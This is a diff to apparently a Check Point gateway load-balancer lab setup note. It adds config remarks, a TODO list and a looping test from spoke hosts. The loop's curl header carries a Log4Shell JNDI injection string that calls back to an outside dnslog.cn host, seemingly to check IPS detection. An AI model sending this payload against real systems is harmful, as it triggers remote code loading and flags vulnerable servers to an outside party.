@@ -20,5 +20,18 @@ autoprov_cfg init AWS -mn CP-Management-gwlb-tf -tn gwlb-configuration -otp Welc
 
 autoprov_cfg set template -tn gwlb-configuration -ia -ips
 
+# mgmt ip 10.255.77.227
+# cplic - required for IPS!
+
+#connectivity test from spoke hosts
+while true; do curl -s -m1 ip.iol.cz/ip/; echo; ping -c1 1.1.1.1; sleep 3; curl -s -m2 ip.iol.cz/ip/ -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}';  done
+
 
 ```
+
+TODO:
+- [ ] enable Management API and provision API user
+ -[ ] management license?
+- [ ] timezone 
+- [ ] diagrams
+- [ ] policy made by Terraform
